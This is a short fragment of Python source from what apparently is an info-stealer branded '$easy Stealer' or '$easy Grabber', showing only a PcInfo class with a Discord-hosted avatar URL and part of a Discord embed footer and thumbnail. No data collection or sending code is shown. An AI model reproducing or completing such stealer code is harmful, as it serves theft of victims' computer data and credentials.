...
class PcInfo:
    def __init__(self):
        self.avatar = "https://media.discordapp.net/attachments/921705869689896980/1267398635923181608/mindset.png?ex=66a8a475&is=66a752f5&hm=b37414d162f13cc2d10999fb92521309bc7aa270e400094f5f8c01de9247b011&=&format=webp&quality=lossless"
        self.username = "$easy Stealer"
...
'''
                    ...
                    "footer": {
                        "text": "$easy Grabber | Created By $exy"
                    },
                    "thumbnail": {
                        "url": self.avatar
                    }
